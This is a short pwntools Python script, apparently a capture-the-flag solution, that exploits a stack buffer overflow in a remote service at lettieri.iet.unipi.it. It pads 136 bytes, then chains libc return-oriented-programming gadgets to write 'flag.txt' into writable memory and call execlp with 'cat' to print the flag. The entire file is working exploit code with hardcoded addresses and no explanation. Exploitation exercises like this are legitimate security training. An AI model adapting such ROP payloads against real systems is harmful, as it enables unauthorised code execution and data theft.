from pwn import *

libc_base_addr = 0x7ffff7e05000
execpl_offset = 0x7ffff7ed0b20
cat_string = 0x7ffff7e1b940 # already in libc

pop_rdi_ret = 0x00007ffff7e2b796        # from libc
pop_rsi_ret = 0x00007ffff7e2d90f # from libc
pop_rdx_ret = 0x00007ffff7ed01cd # from libc
pop_rcx_or_al_ret = 0x00007ffff7efd98d # from libc
mov_ptr_rdi_rsi = 0x00007ffff7e653b2

target_memory = 0x403000  # writable memory in main binary

payload = b"A" * 136
payload += p64(pop_rdi_ret) 
payload += p64(target_memory) # load address to write "cat flag.txt"
payload += p64(pop_rsi_ret)
payload += b'flag.txt'  # load "flag.txt" string
payload += p64(mov_ptr_rdi_rsi)  # call write to write "flag.txt" into memory

payload += p64(pop_rdi_ret)
payload += p64(target_memory + 8)  # address after "flag.txt"
payload += p64(pop_rsi_ret) 
payload += p64(0)  # null byte
payload += p64(mov_ptr_rdi_rsi)  # call write to write null byte

payload += p64(pop_rdi_ret)
payload += p64(cat_string)  # address of "cat" string
payload += p64(pop_rsi_ret)
payload += p64(cat_string) 
payload += p64(pop_rdx_ret)
payload += p64(target_memory)  # address of "flag.txt"
payload += p64(pop_rcx_or_al_ret)
payload += p64(0)  # null terminate
payload += p64( execpl_offset)  # call execpl to execute "cat flag.txt"


p = remote("lettieri.iet.unipi.it", 4493)
p.sendline(payload)
p.interactive()
